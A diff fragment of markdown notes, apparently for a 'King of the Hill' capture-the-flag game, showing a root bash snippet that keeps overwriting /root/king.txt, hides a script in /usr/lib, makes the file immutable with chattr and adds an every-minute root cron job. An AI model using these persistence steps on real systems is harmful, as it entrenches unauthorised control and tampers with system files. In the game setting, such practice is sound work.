@@ -24,9 +24,7 @@ while true; do (echo -e 'solcoteh' > /root/king.txt); sleep 0.1; done 2>/dev/nul
 echo "#!/bin/bash" > /usr/lib/yo.sh
 echo 'echo "solcoteh" >| /root/king.txt' >> /usr/lib/yo.sh
 echo "/usr/lib/chattr +i /root/king.txt" >> /usr/lib/yo.sh
-
 chmod +x /usr/lib/yo.sh
-
 (crontab -l 2>/dev/null; echo "* * * * * bash /usr/lib/yo.sh") | sudo crontab -
 ```
 
